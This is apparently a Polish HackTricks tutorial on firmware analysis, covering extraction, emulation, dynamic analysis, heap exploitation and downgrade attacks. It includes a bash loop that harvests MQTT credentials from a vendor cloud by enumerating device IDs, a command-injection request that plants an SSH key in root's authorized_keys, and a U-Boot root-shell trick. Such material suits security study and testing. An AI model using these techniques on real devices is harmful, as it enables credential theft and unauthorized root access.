# Analiza firmware

{{#include ../../banners/hacktricks-training.md}}

## **Wprowadzenie**

### Powiązane zasoby


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware to niezbędne oprogramowanie, które umożliwia prawidłowe działanie urządzeń poprzez zarządzanie komunikacją między komponentami sprzętowymi a oprogramowaniem, z którym użytkownicy wchodzą w interakcję, oraz jej ułatwianie. Jest przechowywany w pamięci trwałej, dzięki czemu urządzenie może uzyskać dostęp do kluczowych instrukcji od momentu włączenia, co prowadzi do uruchomienia systemu operacyjnego. Analiza i potencjalna modyfikacja firmware to kluczowy etap identyfikowania luk w zabezpieczeniach.

## **Zbieranie informacji**

**Zbieranie informacji** to kluczowy początkowy etap pozwalający zrozumieć budowę urządzenia i wykorzystywane przez nie technologie. Proces ten obejmuje gromadzenie danych dotyczących:

- Architektury CPU i uruchamianego systemu operacyjnego
- Szczegółów bootloadera
- Układu sprzętowego i dokumentacji datasheet
- Metryk codebase i lokalizacji kodu źródłowego
- Zewnętrznych bibliotek i typów licencji
- Historii aktualizacji i certyfikatów zgodności z regulacjami
- Diagramów architektury i przepływu
- Ocen bezpieczeństwa i zidentyfikowanych luk

W tym celu nieocenione są narzędzia **open-source intelligence (OSINT)**, podobnie jak analiza wszelkich dostępnych komponentów open-source za pomocą ręcznych i automatycznych procesów przeglądu. Narzędzia takie jak [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) oferują bezpłatną analizę statyczną, którą można wykorzystać do znajdowania potencjalnych problemów.

## **Pozyskiwanie firmware**

Firmware można pozyskać na różne sposoby, z których każdy charakteryzuje się innym poziomem złożoności:

- **Bezpośrednio** ze źródła (od developerów lub producentów)
- **Budując** go na podstawie dostarczonych instrukcji
- **Pobierając** z oficjalnych stron wsparcia
- Wykorzystując zapytania **Google dork** do znajdowania hostowanych plików firmware
- Uzyskując bezpośredni dostęp do **cloud storage**, za pomocą narzędzi takich jak [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Przechwytując **aktualizacje** za pomocą technik man-in-the-middle
- **Ekstrahując** firmware z urządzenia za pośrednictwem połączeń takich jak **UART**, **JTAG** lub **PICit**
- **Nasłuchując** żądań aktualizacji w komunikacji urządzenia
- Identyfikując i wykorzystując **hardcoded update endpoints**
- **Dumpując** firmware z bootloadera lub sieci
- **Wyjmując i odczytując** układ pamięci, gdy wszystkie inne metody zawiodą, przy użyciu odpowiednich narzędzi sprzętowych

### Logi dostępne wyłącznie przez UART: wymuszenie root shell za pomocą U-Boot env we flash

Jeśli UART RX jest ignorowany (dostępne są tylko logi), nadal możesz wymusić shell init poprzez **edycję blobu środowiska U-Boot** offline:

1. Zrzut pamięci SPI flash za pomocą klipsa SOIC-8 i programatora (3.3 V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Zlokalizuj partycję U-Boot env, edytuj `bootargs`, aby zawierało `init=/bin/sh`, a następnie **ponownie oblicz CRC32 środowiska U-Boot** dla tego blobu.
3. Zapisz ponownie wyłącznie partycję env i uruchom urządzenie ponownie; na UART powinien pojawić się shell.

Jest to przydatne w przypadku urządzeń embedded, w których shell bootloadera jest wyłączony, ale partycja env pozwala na zapis za pośrednictwem zewnętrznego dostępu do pamięci flash.

## Analizowanie firmware

Teraz, gdy **masz firmware**, musisz wyekstrahować z niego informacje, aby wiedzieć, jak go analizować. Możesz użyć do tego różnych narzędzi:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Jeśli za pomocą tych narzędzi nie znajdziesz zbyt wiele, sprawdź **entropię** obrazu za pomocą `binwalk -E <bin>` — jeśli entropia jest niska, obraz prawdopodobnie nie jest zaszyfrowany. Jeśli entropia jest wysoka, prawdopodobnie jest zaszyfrowany (lub w jakiś sposób skompresowany).

Ponadto możesz użyć tych narzędzi do wyodrębnienia **plików osadzonych wewnątrz firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Możesz też użyć [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) do przeanalizowania pliku.

### Pobieranie systemu plików

Za pomocą wcześniej wspomnianych narzędzi, takich jak `binwalk -ev <bin>`, powinno być możliwe **wyodrębnienie systemu plików**.\
Binwalk zazwyczaj wyodrębnia go do **folderu nazwanego zgodnie z typem systemu plików**, którym zwykle jest jeden z następujących: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ręczne wyodrębnianie systemu plików

Czasami binwalk **nie będzie mieć magic byte systemu plików w swoich sygnaturach**. W takich przypadkach użyj binwalk do **znalezienia offsetu systemu plików i wycięcia skompresowanego systemu plików** z pliku binarnego, a następnie **ręcznie wyodrębnij** system plików zgodnie z jego typem, korzystając z poniższych kroków.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Uruchom następujące **polecenie dd**, aby wyodrębnić system plików Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatywnie można również uruchomić następujące polecenie.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Dla squashfs (używanego w powyższym przykładzie)

`$ unsquashfs dir.squashfs`

Pliki znajdą się później w katalogu "`squashfs-root`".

- Pliki archiwów CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Dla systemów plików jffs2

`$ jefferson rootfsfile.jffs2`

- Dla systemów plików ubifs z pamięcią NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analiza Firmware

Po uzyskaniu firmware niezbędne jest jego przeanalizowanie w celu zrozumienia jego struktury i potencjalnych podatności. Proces ten obejmuje wykorzystanie różnych narzędzi do analizy i wyodrębniania wartościowych danych z obrazu firmware.

### Narzędzia do analizy wstępnej

Poniżej przedstawiono zestaw poleceń do wstępnej inspekcji pliku binarnego (określanego jako `<bin>`). Polecenia te pomagają zidentyfikować typy plików, wyodrębnić ciągi znaków, przeanalizować dane binarne oraz zrozumieć szczegóły partycji i systemu plików:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Aby ocenić status szyfrowania obrazu, sprawdza się jego **entropię** za pomocą `binwalk -E <bin>`. Niska entropia sugeruje brak szyfrowania, natomiast wysoka entropia wskazuje na możliwe szyfrowanie lub kompresję.

Do wyodrębniania **osadzonych plików** zalecane są narzędzia i zasoby, takie jak dokumentacja **file-data-carving-recovery-tools** oraz **binvis.io** do inspekcji plików.

### Wyodrębnianie systemu plików

Za pomocą `binwalk -ev <bin>` można zwykle wyodrębnić system plików, często do katalogu nazwanego na podstawie typu systemu plików (np. squashfs, ubifs). Jednak gdy **binwalk** nie rozpoznaje typu systemu plików z powodu brakujących magic bytes, konieczne jest ręczne wyodrębnianie. Polega ono na użyciu `binwalk` do zlokalizowania offsetu systemu plików, a następnie polecenia `dd` do wycięcia systemu plików:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Następnie, w zależności od typu filesystemu (np. squashfs, cpio, jffs2, ubifs), do ręcznego wyodrębnienia zawartości używa się różnych poleceń.

### Analiza filesystemu

Po wyodrębnieniu filesystemu rozpoczyna się wyszukiwanie luk w zabezpieczeniach. Analizowane są niezabezpieczone demony sieciowe, hardcoded credentials, endpointy API, funkcje serwerów aktualizacji, niezscompilowany kod, skrypty startowe oraz skompilowane pliki binarne do analizy offline.

**Kluczowe lokalizacje** i **elementy** do sprawdzenia obejmują:

- **etc/shadow** i **etc/passwd** pod kątem danych uwierzytelniających użytkowników
- Certyfikaty SSL i klucze w **etc/ssl**
- Pliki konfiguracyjne i skrypty pod kątem potencjalnych luk
- Osadzone pliki binarne do dalszej analizy
- Typowe web serwery i pliki binarne urządzeń IoT

Kilka narzędzi pomaga wykrywać poufne informacje i luki w filesystemie:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) do wyszukiwania poufnych informacji
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) do kompleksowej analizy firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) do analizy statycznej i dynamicznej

### Kontrole bezpieczeństwa skompilowanych plików binarnych

Zarówno kod źródłowy, jak i skompilowane pliki binarne znalezione w filesystemie muszą zostać dokładnie przeanalizowane pod kątem luk. Narzędzia takie jak **checksec.sh** dla plików binarnych Unix oraz **PESecurity** dla plików binarnych Windows pomagają identyfikować niezabezpieczone pliki binarne, które mogą zostać wykorzystane.

## Pozyskiwanie konfiguracji cloud i danych uwierzytelniających MQTT za pomocą pochodnych tokenów URL

Wiele hubów IoT pobiera konfigurację dla konkretnego urządzenia z endpointu cloud, który wygląda następująco:

- `https://<api-host>/pf/<deviceId>/<token>`

Podczas analizy firmware można odkryć, że `<token>` jest lokalnie wyprowadzany z identyfikatora urządzenia za pomocą hardcoded secret, na przykład:

- token = MD5( deviceId || STATIC_KEY ) i reprezentowany jako wielkie litery szesnastkowe

Taka konstrukcja umożliwia każdemu, kto pozna deviceId i STATIC_KEY, odtworzenie URL i pobranie konfiguracji cloud, często ujawniającej dane uwierzytelniające MQTT w plaintext oraz prefiksy topiców.

Praktyczny workflow:

1) Wyodrębnij deviceId z logów startowych UART

- Podłącz adapter UART 3,3 V (TX/RX/GND) i przechwyć logi:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Poszukaj wierszy wyświetlających wzorzec adresu URL konfiguracji cloud oraz adres brokera, na przykład:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Odzyskaj STATIC_KEY i algorytm tokenu z firmware

- Załaduj pliki binarne do Ghidra/radare2 i wyszukaj ścieżkę konfiguracji ("/pf/") lub użycie MD5.
- Potwierdź algorytm (np. MD5(deviceId||STATIC_KEY)).
- Wyprowadź token w Bash i zamień skrót na wielkie litery:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Pozyskiwanie konfiguracji cloud i danych uwierzytelniających MQTT

- Złóż URL i pobierz JSON za pomocą curl; przeanalizuj go przy użyciu jq, aby wyodrębnić sekrety:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Wykorzystanie plaintext MQTT i słabych ACL-i tematów (jeśli występują)

- Użyj odzyskanych danych uwierzytelniających, aby zasubskrybować tematy konserwacyjne i wyszukać poufne zdarzenia:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumeruj przewidywalne identyfikatory urządzeń (na dużą skalę, z autoryzacją)

- Wiele ekosystemów zawiera bajty OUI/produktu/typu dostawcy, po których następuje sekwencyjny sufiks.
- Możesz iterować po kandydujących identyfikatorach, programowo wyprowadzać tokeny i pobierać konfiguracje:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Uwagi
- Zawsze uzyskaj wyraźną autoryzację przed podjęciem prób masowej enumeracji.
- Jeśli to możliwe, preferuj emulację lub analizę statyczną w celu odzyskania sekretów bez modyfikowania docelowego hardware'u.


Proces emulacji firmware'u umożliwia przeprowadzenie **dynamic analysis** działania urządzenia lub pojedynczego programu. Podejście to może napotkać problemy związane z zależnościami od hardware'u lub architektury, ale przeniesienie głównego systemu plików albo określonych plików binarnych na urządzenie o zgodnej architekturze i kolejności bajtów, takie jak Raspberry Pi, lub do gotowej maszyny wirtualnej może ułatwić dalsze testowanie.

### Emulacja pojedynczych plików binarnych

W przypadku badania pojedynczych programów kluczowe jest określenie kolejności bajtów i architektury CPU programu.

#### Przykład z architekturą MIPS

Do emulacji pliku binarnego dla architektury MIPS można użyć polecenia:
```bash
file ./squashfs-root/bin/busybox
```
Aby zainstalować niezbędne narzędzia emulacyjne:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
W przypadku MIPS (big-endian) używany jest `qemu-mips`, natomiast dla binariów little-endian właściwym wyborem będzie `qemu-mipsel`.

#### Emulacja architektury ARM

W przypadku binariów ARM proces wygląda podobnie, a do emulacji używany jest emulator `qemu-arm`.

### Emulacja całego systemu

Narzędzia takie jak [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i inne umożliwiają pełną emulację firmware'u, automatyzując ten proces i wspomagając analizę dynamiczną.

## Analiza dynamiczna w praktyce

Na tym etapie do analizy używane jest rzeczywiste lub emulowane środowisko urządzenia. Należy zachować dostęp shell do systemu operacyjnego i systemu plików. Emulacja może nie odwzorowywać idealnie interakcji ze sprzętem, dlatego czasami konieczne jest ponowne uruchomienie emulacji. Analiza powinna ponownie objąć system plików, wykorzystać dostępne strony internetowe i usługi sieciowe oraz zbadać podatności bootloadera. Testy integralności firmware'u są kluczowe dla identyfikacji potencjalnych podatności typu backdoor.

## Techniki analizy w czasie wykonywania

Analiza w czasie wykonywania polega na interakcji z procesem lub binarium w jego środowisku operacyjnym, z wykorzystaniem narzędzi takich jak gdb-multiarch, Frida i Ghidra do ustawiania breakpointów oraz identyfikowania podatności za pomocą fuzzingu i innych technik.

W przypadku embedded targets bez pełnego debuggera **skopiuj statycznie linkowany `gdbserver`** na urządzenie i podłącz się zdalnie:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Mapowanie komunikatów Zigbee / radio-co-processor

W hubach IoT stos RF jest często podzielony między **radio MCU** a proces działający w przestrzeni użytkownika systemu Linux. Przydatny workflow polega na odwzorowaniu ścieżki:

1. **Ramka RF** przesyłana drogą radiową
2. **parser po stronie kontrolera** działający na radio MCU
3. **tekstowy protokół szeregowy/UART lub protokół TLV** przekazywany do systemu Linux (na przykład `/dev/tty*`)
4. **dispatcher aplikacji** w głównym daemonie
5. **handler / maszyna stanów właściwa dla protokołu**

Ta architektura tworzy dwa cele reverse engineeringu zamiast jednego. Jeśli kontroler konwertuje binarne ramki radiowe na protokół tekstowy, taki jak `Group,Command,arg1,arg2,...`, odzyskaj:

- **grupy komunikatów** i tablice dispatch
- Które komunikaty mogą pochodzić z **sieci**, a które z samego kontrolera
- Dokładne **pola rozróżniające specyficzne dla producenta** (na przykład Zigbee `manufacturer_code` i własne `cluster_command`)
- Które handlery są osiągalne wyłącznie podczas **commissioning**, wykrywania lub faz pobierania firmware/modelu

W przypadku Zigbee przechwytuj ruch pairing i sprawdź, czy cel nadal korzysta z domyślnego **Link Key** `ZigBeeAlliance09`. Jeśli tak, sniffing ruchu commissioning może ujawnić **Network Key**. Kody instalacyjne Zigbee 3.0 ograniczają to zagrożenie, dlatego odnotuj, czy testowane urządzenie faktycznie ich wymaga.

### Handlery protokołów specyficznych dla producenta i osiągalność kontrolowana przez FSM

Własne komendy Zigbee/ZCL są często lepszym celem niż standaryzowane klastry, ponieważ trafiają do **custom parsing code** i wewnętrznych **FSM**, które przeszły mniej testów walidacyjnych.

Praktyczny workflow:

- Reverse-engineeruj dispatcher komend, aż znajdziesz **handler dostępny wyłącznie dla producenta**.
- Odzyskaj tabele **stanu FSM**, **zdarzenia**, **sprawdzenia**, **akcji** i **następnego stanu**.
- Zidentyfikuj **stany przejściowe**, które automatycznie przechodzą dalej, oraz gałęzie retry/error, które ostatecznie resetują lub zwalniają dane kontrolowane przez atakującego.
- Potwierdź, które prawidłowe wymiany protokołu są wymagane, aby umieścić daemon w podatnym stanie, zamiast zakładać, że podatny handler jest zawsze osiągalny.

W przypadku protokołów wrażliwych na czas replay pakietów z użyciem frameworka Python może być zbyt wolny. Bardziej niezawodnym podejściem jest emulowanie prawidłowego urządzenia na rzeczywistym hardware (na przykład **nRF52840**) z użyciem stacka klasy vendor-grade, aby można było udostępnić właściwe **endpoints**, **attributes** i timing commissioning.

### Klasa błędów fragmented-download w embedded daemonach

Powtarzająca się klasa błędów firmware występuje podczas **fragmented blob/model/configuration downloads**:

1. **Pierwszy fragment** (`offset == 0`) zapisuje `ctx->total_size` i wykonuje `malloc(total_size)`.
2. Kolejne fragmenty sprawdzają wyłącznie kontrolowane przez atakującego pola **lokalne dla pakietu**, takie jak `packet_total_size >= offset + chunk_len`.
3. Kopiowanie używa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez sprawdzenia względem **pierwotnie zaalokowanego rozmiaru**.

Pozwala to atakującemu wysłać:

- Pierwszy prawidłowy fragment z **małym zadeklarowanym całkowitym rozmiarem**, aby wymusić małą alokację heap.
- Późniejszy fragment z **oczekiwanym offsetem**, ale większym `chunk_len`.
- Sfałszowany rozmiar lokalny dla pakietu, który przechodzi bieżące sprawdzenia, jednocześnie przepełniając pierwotnie zaalokowany buffer.

Gdy podatna ścieżka jest chroniona przez logikę commissioning, exploit musi obejmować wystarczającą **emulację urządzenia**, aby przeprowadzić cel do oczekiwanego stanu pobierania modelu lub bloba przed wysłaniem nieprawidłowych fragmentów.

### Wyzwalacze `free()` sterowane przez protokół

W embedded daemonach najłatwiejszym sposobem wywołania heap metadata exploitation często nie jest „czekanie na cleanup”, lecz **wymuszenie własnej obsługi błędów przez protokół**:

- Wysyłaj nieprawidłowe kolejne fragmenty, aby przeprowadzić FSM do stanów **retry** lub **error**.
- Przekrocz próg retry, aby daemon **zresetował kontekst** i zwolnił uszkodzony buffer.
- Wykorzystaj to przewidywalne `free()`, aby uruchomić primitives po stronie allocatora, zanim proces ulegnie awarii z innych przyczyn.

Jest to szczególnie przydatne przeciwko allocatorom **musl/uClibc/dlmalloc-like** w embedded Linux, gdzie uszkodzenie chunk metadata może zamienić logikę unlink/unbin w write primitive. Stabilny wzorzec polega na uszkodzeniu **pola rozmiaru**, aby przekierować przechodzenie allocatora do **fałszywych chunków umieszczonych w przepełnionym bufferze**, zamiast natychmiastowego nadpisywania rzeczywistych wskaźników bin i doprowadzenia do awarii procesu.

## Binary Exploitation i Proof-of-Concept

Tworzenie PoC dla zidentyfikowanych podatności wymaga dogłębnego zrozumienia architektury celu oraz programowania w językach niskopoziomowych. Zabezpieczenia runtime binariów w systemach embedded są rzadkie, lecz gdy występują, konieczne może być użycie technik takich jak Return Oriented Programming (ROP).

### Uwagi dotyczące fastbin exploitation w uClibc (embedded Linux)

- **Fastbins + consolidation:** uClibc używa fastbinów podobnych do tych w glibc. Późniejsza duża alokacja może wywołać `__malloc_consolidate()`, dlatego każdy fałszywy chunk musi przejść sprawdzenia (`sane size`, `fd = 0` oraz sąsiednie chunki postrzegane jako „w użyciu”).
- **Binariów non-PIE z ASLR:** jeśli ASLR jest włączone, ale główny binarny plik jest **non-PIE**, adresy `.data/.bss` wewnątrz binarium są stabilne. Można wskazać obszar, który już przypomina prawidłowy nagłówek heap chunka, aby skierować alokację fastbin na **tablicę wskaźników funkcji**.
- **NUL zatrzymujący parser:** podczas parsowania JSON `\x00` w payloadzie może zatrzymać parsowanie, zachowując jednocześnie końcowe bajty kontrolowane przez atakującego na potrzeby stack pivot/łańcucha ROP.
- **Shellcode przez `/proc/self/mem`:** łańcuch ROP wywołujący `open("/proc/self/mem")`, `lseek()` i `write()` może umieścić wykonywalny shellcode w znanym mapowaniu i przekazać do niego wykonanie.

## Przygotowane systemy operacyjne do analizy firmware

Systemy operacyjne takie jak [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) udostępniają wstępnie skonfigurowane środowiska do testowania bezpieczeństwa firmware, wyposażone w niezbędne narzędzia.

## Przygotowane OS-y do analizy firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS to distro przeznaczone do przeprowadzania security assessment i penetration testing urządzeń Internet of Things (IoT). Oszczędza dużo czasu, udostępniając wstępnie skonfigurowane środowisko ze wszystkimi niezbędnymi narzędziami.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): system operacyjny do embedded security testing, bazujący na Ubuntu 18.04 i wyposażony w narzędzia do testowania bezpieczeństwa firmware.

## Firmware Downgrade Attacks i Insecure Update Mechanisms

Nawet gdy vendor implementuje kryptograficzne sprawdzanie podpisów obrazów firmware, **ochrona przed version rollback (downgrade) jest często pomijana**. Gdy boot- lub recovery-loader sprawdza jedynie podpis za pomocą osadzonego klucza publicznego, ale nie porównuje *wersji* (ani monotonicznego licznika) flashowanego obrazu, atakujący może legalnie zainstalować **starszy, podatny firmware, który nadal ma prawidłowy podpis**, ponownie wprowadzając załatane podatności.

Typowy workflow ataku:

1. **Uzyskaj starszy podpisany obraz**
* Pobierz go z publicznego portalu download vendora, CDN-a lub strony supportu.
* Wyodrębnij go z towarzyszących aplikacji mobilnych/desktopowych (np. z `assets/firmware/` wewnątrz Android APK).
* Pobierz go z repozytoriów stron trzecich, takich jak VirusTotal, archiwa internetowe, fora itp.
2. **Prześlij obraz do urządzenia lub udostępnij go urządzeniu** za pośrednictwem dowolnego wystawionego kanału aktualizacji:
* Web UI, API aplikacji mobilnej, USB, TFTP, MQTT itp.
* Wiele konsumenckich urządzeń IoT udostępnia *nieuwierzytelnione* endpointy HTTP(S), które akceptują zakodowane w Base64 bloby firmware, dekodują je po stronie serwera i uruchamiają recovery/upgrade.
3. Po downgrade wykorzystaj podatność, która została załatana w nowszym wydaniu (na przykład filtr command injection dodany później).
4. Opcjonalnie ponownie wgraj najnowszy obraz lub wyłącz aktualizacje, aby uniknąć wykrycia po uzyskaniu persistence.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
W podatnym (zdegradowanym) firmware parametr `md5` jest bezpośrednio dołączany do polecenia powłoki bez sanityzacji, co umożliwia wstrzyknięcie dowolnych poleceń (w tym przypadku – uzyskanie dostępu root na podstawie klucza SSH). Nowsze wersje firmware wprowadziły podstawowy filtr znaków, jednak brak ochrony przed downgrade sprawia, że poprawka jest nieskuteczna.

### Ekstrakcja firmware z aplikacji mobilnych

Wielu vendorów dołącza pełne obrazy firmware do swoich towarzyszących aplikacji mobilnych, aby aplikacja mogła aktualizować urządzenie przez Bluetooth/Wi-Fi. Pakiety te są często przechowywane w postaci niezaszyfrowanej w APK/APEX, w ścieżkach takich jak `assets/fw/` lub `res/raw/`. Narzędzia takie jak `apktool`, `ghidra`, a nawet zwykły `unzip` umożliwiają wyodrębnienie podpisanych obrazów bez fizycznego dostępu do sprzętu.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Ominięcie anti-rollback wyłącznie w updaterze w projektach ze slotami A/B

Niektórzy vendorzy implementują **ratchet** anti-downgrade, ale wyłącznie w logice *updatera* (na przykład w procedurze UDS przez CAN, komendzie recovery lub agencie OTA działającym w userspace). Jeśli **bootloader** sprawdza później tylko sygnaturę/CRC obrazu i ufa tabeli partycji lub metadanym slotu, ochrona przed rollbackiem nadal może zostać ominięta.

Typowy słaby projekt:

- Metadane firmware zawierają zarówno deskryptor wersji, jak i **security ratchet** / monotoniczny licznik.
- Updater porównuje ratchet obrazu z wartością zapisaną w persistent storage i odrzuca starsze podpisane obrazy.
- Bootloader nie parsuje tego ratchet i weryfikuje wyłącznie nagłówek, CRC oraz sygnaturę przed uruchomieniem.
- Aktywacja slotu jest przechowywana osobno, w tabeli partycji lub w liczniku generacji dla slotu, i nie jest kryptograficznie powiązana z dokładnym digestem firmware, który został zweryfikowany.

Tworzy to w systemach dual-slot prymityw **validate-one-image / boot-another-image**. Jeśli attacker może sprawić, że updater oznaczy slot B jako następny cel bootowania przy użyciu aktualnego podpisanego obrazu, a następnie nadpisać slot B przed rebootem, bootloader może nadal uruchomić downgraded image, ponieważ ufa wyłącznie wcześniej zapisanym metadanym slotu.

Typowy wzorzec nadużycia:

1. Wgraj **current signed** firmware do pasywnego slotu i uruchom standardową procedurę walidacji/przełączania, aby layout oznaczył ten slot jako następny aktywny.
2. **Nie wykonuj jeszcze rebootu**. W tej samej sesji ponownie wejdź do procedury przygotowania/wymazywania slotu.
3. Wykorzystaj nieaktualny stan bootowania lub nieaktualną logikę wyboru slotu, aby updater wymazał **ten sam fizyczny slot**, który właśnie został promowany.
4. Zapisz w tym slocie **older but still signed** firmware.
5. Pomiń procedurę walidacji, która wymusza ratchet, i wykonaj bezpośredni reboot.
6. Bootloader wybierze promowany slot, zweryfikuje wyłącznie sygnaturę/integralność i uruchomi stary obraz.

Rzeczy, których należy szukać podczas reverse engineeringu implementacji aktualizacji A/B:

- Wybór slotu wyprowadzany z **boot-time flags**, które nie są odświeżane po pomyślnym przełączeniu.
- Procedura w stylu `prepare_passive_slot()`, która wymazuje slot na podstawie nieaktualnego stanu zamiast **aktualnego zatwierdzonego layoutu**.
- Funkcja w stylu `part_write_layout()`, która tylko zwiększa **generation counter** / active flag i nie zapisuje hasha zweryfikowanego obrazu.
- Sprawdzanie ratchet zaimplementowane w userspace lub kodzie updatera, ale **nie** w ROM / bootloaderze / etapach secure boot.
- Procedury wymazywania lub recovery, które pozostawiają slot oznaczony jako bootowalny nawet po usunięciu i ponownym zapisaniu jego zawartości.

### Lista kontrolna oceny logiki aktualizacji

* Czy transport/uwierzytelnianie *update endpoint* jest odpowiednio chronione (TLS + authentication)?
* Czy urządzenie porównuje **numery wersji** lub **monotoniczny licznik anti-rollback** przed flashowaniem?
* Czy obraz jest weryfikowany w ramach secure boot chain (np. sygnatury są sprawdzane przez kod ROM)?
* Czy **bootloader wymusza ten sam ratchet** co updater, zamiast sprawdzać tylko sygnaturę/CRC?
* Czy metadane aktywacji slotu są **powiązane ze zweryfikowanym digestem/wersją firmware**, czy slot można modyfikować po promocji?
* Po pomyślnym przełączeniu slotu, czy urządzenie jest zmuszane do rebootu, czy późniejsze procedury aktualizacji/wymazywania są nadal dostępne w tej samej sesji?
* Czy kod userland wykonuje dodatkowe sanity checks (np. dozwolona mapa partycji, numer modelu)?
* Czy przepływy aktualizacji *partial* lub *backup* ponownie wykorzystują tę samą logikę walidacji?

> 💡  Jeśli któregoś z powyższych elementów brakuje, platforma prawdopodobnie jest podatna na ataki rollback.

## Podatny firmware do ćwiczeń

Aby ćwiczyć wykrywanie podatności w firmware, użyj poniższych projektów podatnego firmware jako punktu wyjścia.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Odzyskiwanie kluczy deszyfrujących firmware ze stanu osadzonego KMS/Vault

